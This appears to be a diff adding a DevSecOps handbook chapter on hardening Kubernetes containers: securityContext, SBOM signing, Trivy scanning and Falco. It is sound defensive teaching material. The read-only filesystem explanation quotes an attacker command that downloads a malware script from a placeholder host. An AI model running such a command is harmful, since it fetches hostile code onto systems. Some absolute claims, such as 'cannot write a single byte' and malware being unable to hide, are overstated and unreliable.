@@ -1,0 +1,275 @@
+---
+contentId: container-security
+title: "DevSecOps (Container Security)"
+titleAr: "DevSecOps — أمان الحاويات"
+description: "Build a pipeline that cannot publish a vulnerable image"
+descriptionAr: "فحص الصور، والمستخدم غير الجذر (non-root)، وسلسلة التوريد."
+domain: security
+level: advanced
+type: concept
+phase: security
+order: 33
+readingTime: 55
+prerequisites: ["docker"]
+relatedChapters: ["network-policies"]
+objectives:
+  - "Build a pipeline that cannot publish a vulnerable image"
+status: complete
+translationStatus: missing
+sourceFile: "Cloud-Native-DevOps-Handbook/33_Security.md"
+authors: [waleed]
+updated: 2026-08-08
+---
+
+## Introduction to Container Security
+
+We have built a beautiful, highly-available, automated DevOps pipeline. 
+But if you run an insecure Docker container in your Kubernetes cluster, a hacker will break in, escape the container, take over the Worker Node, and delete your RDS database.
+
+**DevSecOps** is the practice of integrating security into every single step of the pipeline, rather than treating it as an afterthought.
+
+---
+
+## Level 1 — Beginner
+
+### What is Container Security?
+Imagine you run a hotel (Kubernetes).
+A guest (a Docker Container) arrives. 
+- **The Old Way:** You trust the guest. You give them a master key to the hotel. They go into the kitchen, steal the food, and burn the hotel down.
+- **The DevSecOps Way:** Before the guest arrives, you run a background check (Trivy Scan). When they arrive, you lock them in their room (Network Policies). You bolt the windows shut (Read-Only Filesystem), and you ensure they do not have a master key (Non-Root User). 
+
+### Why do we need it?
+Hackers are automated. They use bots to scan GitHub for leaked passwords and scan the internet for unpatched software. If you deploy a Docker image that has a known vulnerability (a CVE), a bot will hack your server within 45 minutes of it going live.
+
+---
+
+## Level 2 — Intermediate
+
+### Shift-Left Security
+Traditionally, developers wrote the code, QA tested it, and right before it went to Production, the Security Team audited it. If the Security Team found a flaw, the release was delayed by 3 weeks. Everyone hated the Security Team.
+
+**Shift-Left** means moving security to the "left" of the pipeline (earlier in time).
+1. We scan the code for passwords directly inside the developer's IDE before they even commit.
+2. We scan the Docker image inside the Jenkins pipeline using **Trivy**. If a vulnerability is found, Jenkins instantly fails the build. The broken code never even makes it to ECR, let alone Kubernetes.
+
+### Principle of Least Privilege in Kubernetes
+By default, Docker containers run as `root` (the supreme administrator). This is incredibly dangerous. If a hacker exploits a bug in your Node.js app, they gain `root` access to the container.
+
+In Kubernetes, we use a `securityContext` to strip these privileges away.
+
+```yaml
+spec:
+  securityContext:
+    runAsNonRoot: true          # refuse to start at all if the image runs as root
+    runAsUser: 10001
+    fsGroup: 10001              # mounted volumes become group-writable by this GID
+    seccompProfile:
+      type: RuntimeDefault      # block the unusual syscalls a normal app never makes
+  containers:
+    - name: api
+      image: ghcr.io/ivolve/api:1.4.0
+      securityContext:
+        allowPrivilegeEscalation: false   # no setuid path back up to root
+        readOnlyRootFilesystem: true      # the image cannot be modified at runtime
+        capabilities:
+          drop: ["ALL"]                   # give back every Linux capability
+```
+
+Line by line, each of these closes a specific door:
+
+- **`runAsNonRoot: true`** — a guarantee, not a request. If the image's `USER` is
+  root, the Pod fails to start rather than quietly running privileged.
+- **`allowPrivilegeEscalation: false`** — stops a process gaining more privileges
+  than its parent, which is how most container escapes begin.
+- **`readOnlyRootFilesystem: true`** — an attacker who achieves code execution
+  cannot write a payload to disk. Applications that need scratch space get an
+  `emptyDir` volume mounted at `/tmp` instead.
+- **`capabilities: drop: ["ALL"]`** — Linux splits root's powers into ~40
+  capabilities. Almost every application needs none of them. Drop everything,
+  then add back only what genuinely breaks (`NET_BIND_SERVICE` for a process that
+  must listen below port 1024 — though changing the port is usually better).
+
+**Enforcing it cluster-wide.** Setting this per Pod relies on everyone
+remembering. **Pod Security Admission** applies it at the namespace boundary:
+
+```bash
+kubectl label namespace production \
+  pod-security.kubernetes.io/enforce=restricted
+```
+
+Any Pod that does not meet the `restricted` standard is now rejected on
+submission. Start with `warn` on an existing namespace to see what would break
+before you switch to `enforce`.
+
+---
+
+## Level 3 — Advanced
+
+### Analyzing the Actual Code (Line-by-Line Breakdown)
+
+Let's look at the `kubernetes/base/api-deployment.yaml` file to see how we lock down a container.
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ivolve-api
+  namespace: ivolve
+spec:
+  template:
+    spec:
+      serviceAccountName: ivolve-api
+      automountServiceAccountToken: false
+
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        runAsGroup: 10001
+        fsGroup: 10001
+        seccompProfile:
+          type: RuntimeDefault
+
+      containers:
+        - name: ivolve-api
+          image: ivolve-api:1.0.0
+
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop: ["ALL"]
+
+          volumeMounts:
+            - name: tmp
+              mountPath: /tmp
+
+      # readOnlyRootFilesystem means the JVM needs a writable /tmp supplied
+      # explicitly rather than inheriting the container's writable layer.
+      volumes:
+        - name: tmp
+          emptyDir:
+            sizeLimit: 256Mi
+```
+
+**Line-by-Line Breakdown:**
+- **`runAsNonRoot: true`**: Kubernetes will strictly refuse to start this container if the Dockerfile says `USER root`. It enforces that developers write secure Dockerfiles.
+- **`allowPrivilegeEscalation: false`**: This prevents a hacker from using the `sudo` command or exploiting `setuid` binaries to become root, even if they compromise the app.
+- **`readOnlyRootFilesystem: true`**: This is the ultimate defense. Hackers rely on downloading malware (like a crypto-miner) into the server (`wget http://hacker.com/malware.sh -O /tmp/malware.sh`). With this setting, the entire hard drive is physically locked. The hacker cannot write a single byte of data to the disk.
+- **`capabilities: drop: - ALL`**: The Linux Kernel has specific capabilities (like changing the system clock, or modifying network routes). By default, Docker grants some of these to containers. We drop absolutely all of them, making the container completely useless for anything except running the API.
+
+---
+
+## Level 4 — Enterprise
+
+### Supply Chain Attacks and Software Bill of Materials (SBOM)
+If you download an open-source library from NPM or Maven, how do you know the author wasn't hacked? A **Supply Chain Attack** occurs when a hacker poisons a popular open-source library. When you compile your app, you unknowingly bundle the malware.
+
+To fight this, the US Government issued an Executive Order requiring a **Software Bill of Materials (SBOM)**.
+An SBOM is a cryptographic list of every single dependency, sub-dependency, and OS library inside your Docker image. 
+In our enterprise pipeline, Trivy generates an SBOM (in CycloneDX format) and signs it using **Cosign**. When the image reaches Kubernetes, an admission controller (like Kyverno or OPA Gatekeeper) cryptographically verifies the signature. If the signature doesn't match the SBOM, Kubernetes refuses to run the image.
+
+**The three commands that implement that paragraph:**
+
+```bash
+# 1. Generate the SBOM at build time and keep it as a build artifact
+trivy image --format cyclonedx --output sbom.json ghcr.io/ivolve/api:1.4.0
+
+# 2. Sign the image. Keyless signing uses the CI job's OIDC identity,
+#    so there is no private key to store or leak.
+COSIGN_EXPERIMENTAL=1 cosign sign ghcr.io/ivolve/api@sha256:abc123...
+
+# 3. Verify before it runs — this is what the admission controller automates
+cosign verify ghcr.io/ivolve/api@sha256:abc123... \
+  --certificate-identity-regexp 'https://github.com/Waleeddarwesh/.*' \
+  --certificate-oidc-issuer https://token.actions.githubusercontent.com
+```
+
+Two details make this real rather than ceremonial:
+
+- **Sign the digest, never the tag.** A tag can be repointed at a different
+  image; `@sha256:...` names exactly one set of bytes. Signing `:1.4.0` proves
+  nothing, because `:1.4.0` can be pushed again tomorrow.
+- **Verify identity, not just "a signature exists".** The
+  `--certificate-identity-regexp` flag is the substance of the check: it asserts
+  the image was built by *your* pipeline. Without it you have only proved that
+  somebody, somewhere, signed something.
+
+An SBOM's real payoff arrives the day a CVE is announced in a library you have
+never heard of. The question "are we affected, and where?" becomes a search
+across stored SBOMs and takes minutes — instead of a week of asking every team
+what their images contain.
+
+### Image Scanning in Practice
+
+A scanner compares the packages inside an image against public vulnerability
+databases. Every image inherits its base image's vulnerabilities, so scanning is
+not about *your* code — it is about the 220 MB of operating system underneath it.
+
+```bash
+# Scan an image, and fail the build only on what you can act on
+trivy image --severity HIGH,CRITICAL --exit-code 1 ghcr.io/ivolve/api:1.4.0
+
+# Ignore findings with no fix available yet — they only create noise
+trivy image --ignore-unfixed --severity HIGH,CRITICAL ghcr.io/ivolve/api:1.4.0
+
+# Scan the Terraform and Kubernetes manifests too, not just the image
+trivy config ./infrastructure
+```
+
+`--exit-code 1` is what turns a report into a gate: the scanner returns non-zero,
+the pipeline stage fails, and the image never reaches the registry.
+
+**Where to scan — all three, for different reasons:**
+
+| Stage | Catches | Why here |
+| --- | --- | --- |
+| Pull request | A bad dependency before it merges | Cheapest possible fix |
+| Build pipeline | A vulnerable base image | Blocks the push to the registry |
+| Registry, continuously | A CVE published *after* you shipped | The image did not change — the world did |
+
+That third row is the one teams forget. An image that passed on Monday can be
+critically vulnerable on Friday without a single line changing, which is why ECR
+and Harbor rescan stored images on a schedule.
+
+**Reducing the surface instead of patching it.** The most effective response to a
+long scan report is usually a smaller base image:
+
+| Base | Typical size | Typical CVE count |
+| --- | --- | --- |
+| `ubuntu:22.04` | ~78 MB | Dozens |
+| `alpine:3.20` | ~8 MB | A handful |
+| `gcr.io/distroless/java17` | ~230 MB | Very few — no shell, no package manager |
+
+Distroless images contain your application and its runtime, and nothing else —
+no `sh`, no `apt`, no `curl`. There is less to patch, and an attacker who gets
+code execution finds no tools waiting for them. The trade-off is that
+`kubectl exec` gives you no shell, so debugging moves to ephemeral containers
+(`kubectl debug`).
+
+### Falco (Runtime Security)
+Trivy protects the container *before* it runs. What protects it *while* it runs?
+We use **Falco** (a CNCF project).
+Falco is a daemon that hooks directly into the Linux Kernel (via eBPF). It watches every single system call the container makes.
+If a developer tries to `kubectl exec` into a running production container and type `ls /etc`, Falco instantly detects the anomalous system call, generates a Critical Alert, and can optionally kill the Pod immediately. It is the CCTV camera of the Kubernetes cluster.
+
+---
+
+## Interview Questions
+
+### Beginner
+**Q: Why shouldn't a Docker container run as `root`?**
+A: If a hacker finds a vulnerability in your application and breaks in, they inherit the permissions of the user running the application. If the user is `root`, the hacker can install malware, alter files, or attempt a container-escape attack to take over the underlying host node.
+
+### Intermediate
+**Q: What does the term "Shift-Left" mean in DevSecOps?**
+A: It refers to moving security checks (like vulnerability scanning and static code analysis) to the earliest possible stages of the software development lifecycle (e.g., local IDEs, Git pre-commit hooks, and CI pipelines), rather than waiting for a QA or Security audit right before production deployment.
+
+### Senior
+**Q: A developer complains that their application crashes on startup when you apply `readOnlyRootFilesystem: true` because the app needs to write temporary cache files to `/tmp`. How do you fix this securely?**
+A: You do not remove `readOnlyRootFilesystem: true`. Instead, you provide a temporary, isolated writable space specifically for that folder by mounting an `emptyDir` volume backed by memory (tmpfs) to the `/tmp` path in the Pod specification. The rest of the OS remains strictly read-only.
+
+### Principal/Architect
+**Q: Explain how eBPF is revolutionizing Kubernetes runtime security (e.g., using Falco or Tetragon) compared to traditional Sidecar-based security architectures.**
+A: Traditional sidecar security requires injecting a proxy container into every single Pod. This consumes massive overhead (CPU/RAM per pod) and only has visibility into network traffic or specific application layers; it cannot easily see kernel-level file modifications or process executions. 
+**eBPF (Extended Berkeley Packet Filter)** runs directly inside the Linux Kernel of the Worker Node. It safely executes sandbox programs on kernel events (like `sys_execve` or `sys_open`). Because it runs at the kernel level, a single eBPF agent on the Node has 100% visibility into every single system call made by every container on that Node, with near-zero performance overhead, making it impossible for user-space malware to hide from it.
+[Contents](/learn) | [34 — Zero-Trust (Network Policies)](/learn/security/network-policies) |
